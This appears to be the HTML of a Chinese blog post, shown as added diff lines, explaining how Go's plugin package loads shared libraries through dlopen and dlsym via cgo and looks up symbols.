+<p>上述代码定义了 <code>Driver</code> 接口并认为共享库中一定包含 <code>func NewDriver() Driver</code> 函数，当我们通过 <a href="https://draveness.me/golang/tree/plugin.Open" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.Open</code></a> 读取包含 Go 语言插件的共享库后，获取文件中的 <code>NewDriver</code> 符号并转换成正确的函数类型，可以通过该函数初始化新的 <code>Driver</code> 并获取它的名字了。</p>
+<h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p>不同的操作系统会实现不同的动态链接机制和共享库格式，Linux 中的共享对象会使用 ELF 格式<a href="https://draveness.me/golang/docs/part4-advanced/ch08-metaprogramming/golang-plugin/#fn:3" target="_blank" rel="external nofollow noopener noreferrer">3</a>并提供了一组操作动态链接器的接口，在本节的实现中我们会看到以下的几个接口<a href="https://draveness.me/golang/docs/part4-advanced/ch08-metaprogramming/golang-plugin/#fn:4" target="_blank" rel="external nofollow noopener noreferrer">4</a>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">dlopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> flag)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">dlerror</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">dlsym</span><span class="params">(<span class="keyword">void</span> *handle, <span class="keyword">const</span> <span class="keyword">char</span> *symbol)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dlclose</span><span class="params">(<span class="keyword">void</span> *handle)</span></span>;</span><br></pre></td></tr></table></figure>
+<p><code>dlopen</code> 会根据传入的文件名加载对应的动态库并返回一个句柄（Handle）；我们可以直接使用 <code>dlsym</code> 函数在该句柄中搜索特定的符号，也就是函数或者变量，它会返回该符号被加载到内存中的地址。因为待查找的符号可能不存在于目标动态库中，所以在每次查找后我们都应该调用 <code>dlerror</code> 查看当前查找的结果。</p>
+<h2 id="动态库"><a href="#动态库" class="headerlink" title="动态库"></a>动态库</h2><p>Go 语言插件系统的全部实现都包含在 <a href="https://pkg.go.dev/plugin" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin</code></a> 中，这个包实现了符号系统的加载和决议。插件是一个带有公开函数和变量的包，我们需要使用下面的命令编译插件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -buildmode=plugin ...</span><br></pre></td></tr></table></figure>
+<p>该命令会生成一个共享对象 <code>.so</code> 文件，当该文件被加载到 Go 语言程序时会使用下面的结构体 <a href="https://draveness.me/golang/tree/plugin.Plugin" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.Plugin</code></a> 表示，该结构体中包含文件的路径以及包含的符号等信息：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Plugin <span class="keyword">struct</span> &#123;</span><br><span class="line">	pluginpath <span class="keyword">string</span></span><br><span class="line">	syms       <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>与插件系统相关的两个核心方法分别是用于加载共享文件的 <a href="https://draveness.me/golang/tree/plugin.Open" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.Open</code></a> 和在插件中查找符号的 <a href="https://draveness.me/golang/tree/plugin.Plugin.Lookup" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.Plugin.Lookup</code></a>，本节将详细介绍它们的实现原理。</p>
+<h3 id="CGO"><a href="#CGO" class="headerlink" title="CGO"></a>CGO</h3><p>在具体分析 <a href="https://pkg.go.dev/plugin" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin</code></a> 包中几个公有方法之前，我们需要先了解一下包中使用的两个 C 语言函数 <a href="https://draveness.me/golang/tree/plugin.pluginOpen" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.pluginOpen</code></a> 和 <a href="https://draveness.me/golang/tree/plugin.pluginLookup" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.pluginLookup</code></a>；<a href="https://draveness.me/golang/tree/plugin.pluginOpen" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.pluginOpen</code></a> 只是简单包装了一下标准库中的 <code>dlopen</code> 和 <code>dlerror</code> 函数并在加载成功后返回指向动态库的句柄：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uintptr_t</span> <span class="title">pluginOpen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">char</span>** err)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span>* h = dlopen(path, RTLD_NOW|RTLD_GLOBAL);</span><br><span class="line">	<span class="keyword">if</span> (h == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		*err = (<span class="keyword">char</span>*)dlerror();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">uintptr_t</span>)h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><a href="https://draveness.me/golang/tree/plugin.pluginLookup" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.pluginLookup</code></a> 使用了标准库中的 <code>dlsym</code> 和 <code>dlerror</code> 获取动态库句柄中的特定符号：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">pluginLookup</span><span class="params">(<span class="keyword">uintptr_t</span> h, <span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">char</span>** err)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span>* r = dlsym((<span class="keyword">void</span>*)h, name);</span><br><span class="line">	<span class="keyword">if</span> (r == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		*err = (<span class="keyword">char</span>*)dlerror();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这两个函数的实现原理都比较简单，它们的作用也只是简单封装标准库中的 C 语言函数，让它们的签名看起来更像是 Go 语言中的函数签名，方便在 Go 语言中调用。</p>
+<h3 id="加载过程"><a href="#加载过程" class="headerlink" title="加载过程"></a>加载过程</h3><p>用于加载共享对象的函数 <a href="https://draveness.me/golang/tree/plugin.Open" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.Open</code></a> 会将共享对象文件的路径作为参数并返回 <a href="https://draveness.me/golang/tree/plugin.Plugin" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.Plugin</code></a> 结构：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Open</span><span class="params">(path <span class="keyword">string</span>)</span> <span class="params">(*Plugin, error)</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> open(path)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述函数会调用私有的函数 <a href="https://draveness.me/golang/tree/plugin.open" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.open</code></a> 加载插件，它是插件加载过程的核心函数，我们可以将该函数拆分成以下几个步骤：</p>
+<ol>
+<li>准备 C 语言函数 <a href="https://draveness.me/golang/tree/plugin.pluginOpen" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.pluginOpen</code></a> 的参数；</li>
+<li>通过 cgo 调用 <a href="https://draveness.me/golang/tree/plugin.pluginOpen" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.pluginOpen</code></a> 并初始化加载的模块；</li>
+<li>查找加载模块中的 <code>init</code> 函数并调用该函数；</li>
+<li>通过插件的文件名和符号列表构建 <a href="https://draveness.me/golang/tree/plugin.Plugin" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.Plugin</code></a> 结构；</li>
+</ol>
+<p>首先是使用 cgo 提供的一些结构准备调用 <a href="https://draveness.me/golang/tree/plugin.pluginOpen" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.pluginOpen</code></a> 所需要的参数，下面的代码会将文件名转换成 <code>*C.char</code> 类型的变量，该类型的变量可以作为参数传入 C 函数：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">open</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="params">(*Plugin, error)</span></span> &#123;</span><br><span class="line">	cPath := <span class="built_in">make</span>([]<span class="keyword">byte</span>, C.PATH_MAX+<span class="number">1</span>)</span><br><span class="line">	cRelName := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(name)+<span class="number">1</span>)</span><br><span class="line">	<span class="built_in">copy</span>(cRelName, name)</span><br><span class="line">	<span class="keyword">if</span> C.realpath(</span><br><span class="line">		(*C.char)(unsafe.Pointer(&amp;cRelName[<span class="number">0</span>])),</span><br><span class="line">		(*C.char)(unsafe.Pointer(&amp;cPath[<span class="number">0</span>]))) == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">`plugin.Open("`</span> + name + <span class="string">`"): realpath failed`</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	filepath := C.GoString((*C.char)(unsafe.Pointer(&amp;cPath[<span class="number">0</span>])))</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">var</span> cErr *C.char</span><br><span class="line">	h := C.pluginOpen((*C.char)(unsafe.Pointer(&amp;cPath[<span class="number">0</span>])), &amp;cErr)</span><br><span class="line">	<span class="keyword">if</span> h == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">`plugin.Open("`</span> + name + <span class="string">`"): `</span> + C.GoString(cErr))</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当我们拿到了指向动态库的句柄之后会调用 <a href="https://draveness.me/golang/tree/plugin.lastmoduleinit" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.lastmoduleinit</code></a>，链接器会将它会链接到运行时的 <a href="https://draveness.me/golang/tree/runtime.plugin_lastmoduleinit" target="_blank" rel="external nofollow noopener noreferrer"><code>runtime.plugin_lastmoduleinit</code></a> 函数上，它会解析文件中的符号并返回共享文件的目录和其中包含的全部符号：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">open</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="params">(*Plugin, error)</span></span> &#123;</span><br><span class="line">	...</span><br><span class="line">	pluginpath, syms, errstr := lastmoduleinit()</span><br><span class="line">	<span class="keyword">if</span> errstr != <span class="string">""</span> &#123;</span><br><span class="line">		plugins[filepath] = &amp;Plugin&#123;</span><br><span class="line">			pluginpath: pluginpath,</span><br><span class="line">			err:        errstr,</span><br><span class="line">		&#125;</span><br><span class="line">		pluginsMu.Unlock()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">`plugin.Open("`</span> + name + <span class="string">`"): `</span> + errstr)</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在该函数的最后，我们会构建一个新的 <a href="https://draveness.me/golang/tree/plugin.Plugin" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.Plugin</code></a> 结构体并遍历 <a href="https://draveness.me/golang/tree/plugin.lastmoduleinit" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.lastmoduleinit</code></a> 返回的全部符号，为每一个符号调用 <a href="https://draveness.me/golang/tree/plugin.pluginLookup" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.pluginLookup</code></a>：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">open</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="params">(*Plugin, error)</span></span> &#123;</span><br><span class="line">	...</span><br><span class="line">	p := &amp;Plugin&#123;</span><br><span class="line">		pluginpath: pluginpath,</span><br><span class="line">	&#125;</span><br><span class="line">	plugins[filepath] = p</span><br><span class="line">	...</span><br><span class="line">	updatedSyms := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> symName, sym := <span class="keyword">range</span> syms &#123;</span><br><span class="line">		isFunc := symName[<span class="number">0</span>] == <span class="string">'.'</span></span><br><span class="line">		<span class="keyword">if</span> isFunc &#123;</span><br><span class="line">			<span class="built_in">delete</span>(syms, symName)</span><br><span class="line">			symName = symName[<span class="number">1</span>:]</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		fullName := pluginpath + <span class="string">"."</span> + symName</span><br><span class="line">		cname := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(fullName)+<span class="number">1</span>)</span><br><span class="line">		<span class="built_in">copy</span>(cname, fullName)</span><br><span class="line"></span><br><span class="line">		p := C.pluginLookup(h, (*C.char)(unsafe.Pointer(&amp;cname[<span class="number">0</span>])), &amp;cErr)</span><br><span class="line">		valp := (*[<span class="number">2</span>]unsafe.Pointer)(unsafe.Pointer(&amp;sym))</span><br><span class="line">		<span class="keyword">if</span> isFunc &#123;</span><br><span class="line">			(*valp)[<span class="number">1</span>] = unsafe.Pointer(&amp;p)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			(*valp)[<span class="number">1</span>] = p</span><br><span class="line">		&#125;</span><br><span class="line">		updatedSyms[symName] = sym</span><br><span class="line">	&#125;</span><br><span class="line">	p.syms = updatedSyms</span><br><span class="line">	<span class="keyword">return</span> p, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述函数在最后会返回一个包含符号名到函数或者变量映射的 <a href="https://draveness.me/golang/tree/plugin.Plugin" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.Plugin</code></a> 结构体，调用方可以将该结构体作为句柄查找其中的符号，需要注意的是，我们在这段代码中省略了查找 <code>init</code> 并初始化插件的过程。</p>
+<h3 id="符号查找"><a href="#符号查找" class="headerlink" title="符号查找 #"></a>符号查找 <a href="https://draveness.me/golang/docs/part4-advanced/ch08-metaprogramming/golang-plugin/#符号查找" target="_blank" rel="external nofollow noopener noreferrer">#</a></h3><p><a href="https://draveness.me/golang/tree/plugin.Plugin.Lookup" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.Plugin.Lookup</code></a> 可以在 <a href="https://draveness.me/golang/tree/plugin.Open" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.Open</code></a> 返回的结构体中查找符号 <a href="https://draveness.me/golang/tree/plugin.Symbol" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.Symbol</code></a>，该符号是 <code>interface{}</code> 类型的一个别名，我们可以将它转换成变量或者函数真实的类型：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Plugin)</span> <span class="title">Lookup</span><span class="params">(symName <span class="keyword">string</span>)</span> <span class="params">(Symbol, error)</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> lookup(p, symName)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookup</span><span class="params">(p *Plugin, symName <span class="keyword">string</span>)</span> <span class="params">(Symbol, error)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> s := p.syms[symName]; s != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> s, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">"plugin: symbol "</span> + symName + <span class="string">" not found in plugin "</span> + p.pluginpath)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述方法调用的私有函数 <a href="https://draveness.me/golang/tree/plugin.lookup" target="_blank" rel="external nofollow noopener noreferrer"><code>plugin.lookup</code></a> 实现比较简单，它直接利用了结构体中的符号表，如果没有找到对应的符号会直接返回错误。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Go 语言的插件系统利用了操作系统的动态库实现模块化的设计，它提供功能虽然比较有趣，但是在实际使用中会遇到比较多的限制，目前的插件系统也仅支持 Linux、Darwin 和 FreeBSD，在 Windows 上是没有办法使用的。因为插件系统的实现基于一些黑魔法，所以跨平台的编译也会遇到一些比较奇葩的问题，作者在使用插件系统时也踩过很多坑，如果对 Go 语言不是特别了解，还是不建议使用该模块的。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://github.com/libragen/felix/tree/master/plugin" target="_blank" rel="external nofollow noopener noreferrer">示例代码</a></li>
+<li><a href="https://golang.google.cn/pkg/plugin/#pkg-overview" target="_blank" rel="external nofollow noopener noreferrer">官方标准库文档</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章推荐</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/posts/b9b1d0f7/" rel="bookmark">【Go语言设计与实现】Array</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/posts/251346e5/" rel="bookmark">【Go语言设计与实现】Slice</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/posts/e87a4e07/" rel="bookmark">【Go语言设计与实现】String</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/posts/4e214fa9/" rel="bookmark">【Go语言设计与实现】Function</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/posts/c31234d9/" rel="bookmark">【Go语言设计与实现】Interface</a></div>
+    </li>
+  </ul>
+
+      
+        <div class="reward-container">
+  <div></div>
+  <button disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="https://cosmos-1251905798.cos.ap-beijing.myqcloud.com/theme/wechatpay.png" alt="Houmin 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="https://cosmos-1251905798.cos.ap-beijing.myqcloud.com/theme/alipay.jpg" alt="Houmin 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Houmin
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://houmin.cc/posts/7fc46894/" title="【Go语言设计与实现】Go Plugin">http://houmin.cc/posts/7fc46894/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/null" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Go/" rel="tag"><i class="fa fa-tag"></i> Go</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/posts/6d395926/" rel="next" title="【Go语言设计与实现】栈内存管理">
+                  <i class="fa fa-chevron-left"></i> 【Go语言设计与实现】栈内存管理
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/posts/a4a5a52b/" rel="prev" title="【Go语言设计与实现】HTTP 库">
+                  【Go语言设计与实现】HTTP 库 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="comments"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Go-plugin是什么"><span class="nav-number">1.</span> <span class="nav-text">Go plugin是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Go-plugin生命周期"><span class="nav-number">2.</span> <span class="nav-text">Go plugin生命周期</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Go-plugin应用场景"><span class="nav-number">3.</span> <span class="nav-text">Go plugin应用场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Go-plugin-示例"><span class="nav-number">4.</span> <span class="nav-text">Go plugin 示例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#编写插件plugin代码"><span class="nav-number">4.1.</span> <span class="nav-text">编写插件plugin代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用plugin插件"><span class="nav-number">4.2.</span> <span class="nav-text">使用plugin插件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#build-plugin程序"><span class="nav-number">4.3.</span> <span class="nav-text">build plugin程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#go-run"><span class="nav-number">4.4.</span> <span class="nav-text">go run</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Go语言plugin局限和不足"><span class="nav-number">5.</span> <span class="nav-text">Go语言plugin局限和不足</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Go版本兼容问题"><span class="nav-number">5.1.</span> <span class="nav-text">Go版本兼容问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#设计原理"><span class="nav-number">7.</span> <span class="nav-text">设计原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#插件系统"><span class="nav-number">7.1.</span> <span class="nav-text">插件系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#操作系统"><span class="nav-number">7.2.</span> <span class="nav-text">操作系统</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#动态库"><span class="nav-number">8.</span> <span class="nav-text">动态库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CGO"><span class="nav-number">8.1.</span> <span class="nav-text">CGO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#加载过程"><span class="nav-number">8.2.</span> <span class="nav-text">加载过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#符号查找"><span class="nav-number">8.3.</span> <span class="nav-text">符号查找 #</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">9.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">10.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="site-author-image" itemprop="image" alt="Houmin" src="https://cosmos-1251905798.cos.ap-beijing.myqcloud.com/theme/avatar.png">
+  <p class="site-author-name" itemprop="name">Houmin</p>
+  <div class="site-description" itemprop="description">丈夫拥书万卷，何假南面百城</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">170</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">230</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/SimpCosm" title="GitHub &amp;rarr; https:&#x2F;&#x2F;github.com&#x2F;SimpCosm" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:weihoumin@gmail.com" title="E-Mail &amp;rarr; mailto:weihoumin@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+  <div class="hitokoto">
+    <!-- hitokoto -->
+    <div id="hito-expression">:D 获取中...</div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bluebird@3/js/browser/bluebird.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/whatwg-fetch@2.0.3/fetch.min.js"></script>
+    <script>
+      fetch('https://v1.hitokoto.cn')
+        .then(function (res){
+          return res.json();
+        })
+        .then(function (data) {
+          var hitokoto = document.getElementById('hito-expression');
+          hitokoto.innerText = data.hitokoto + '——【' + data.from + '】';
+        })
+        .catch(function (err) {
+          console.error(err);
+        })
+    </script>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heartbeat"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Houmin</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">2.2m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">65:25</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
